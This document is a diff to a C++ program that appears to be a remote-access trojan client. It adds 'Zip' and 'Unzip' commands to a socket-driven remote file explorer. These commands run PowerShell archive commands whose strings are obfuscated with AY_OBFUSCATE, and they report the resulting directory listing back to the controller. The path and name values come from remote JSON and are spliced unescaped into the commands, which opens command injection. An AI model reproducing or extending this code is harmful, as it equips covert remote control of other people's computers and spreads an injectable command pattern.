@@ -57,7 +57,6 @@ short InstallClient()
 	return 0;
 }
 
-
 json DirFileTOjson(VectDirFile DirFiles)
 {
 	Encode en;
@@ -591,6 +590,52 @@ void FileExplorer(SOCKET Sock)
 			}
 
 			Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
+		}
+		else if (j["Action"] == "Zip")
+		{
+			if (su.NoOutputCMD((string)AY_OBFUSCATE("powershell Compress-Archive '") + en.UnicodeToAscii(j["Path"]) + "' '" + en.UnicodeToAscii(j["Name"]) + ".zip' -force") == 0)
+			{
+				DirFiles.clear();
+				du.GetDir(du.GetCurrDir(), DirFiles);
+
+				j.clear();
+				j = DirFileTOjson(DirFiles);
+
+				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
+			}
+			else
+			{
+				if (DEBUG)
+				{
+					char errmsg[256];
+					strerror_s(errmsg, 256, errno);
+					cout << errmsg << endl;
+				}
+				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
+			}
+		}
+		else if (j["Action"] == "Unzip")
+		{
+			if (su.NoOutputCMD((string)AY_OBFUSCATE("powershell Expand-Archive '") + en.UnicodeToAscii(j["Path"]) + "' -force") == 0)
+			{
+				DirFiles.clear();
+				du.GetDir(du.GetCurrDir(), DirFiles);
+
+				j.clear();
+				j = DirFileTOjson(DirFiles);
+
+				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
+			}
+			else
+			{
+				if (DEBUG)
+				{
+					char errmsg[256];
+					strerror_s(errmsg, 256, errno);
+					cout << errmsg << endl;
+				}
+				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
+			}
 		}
 		else
 			break;
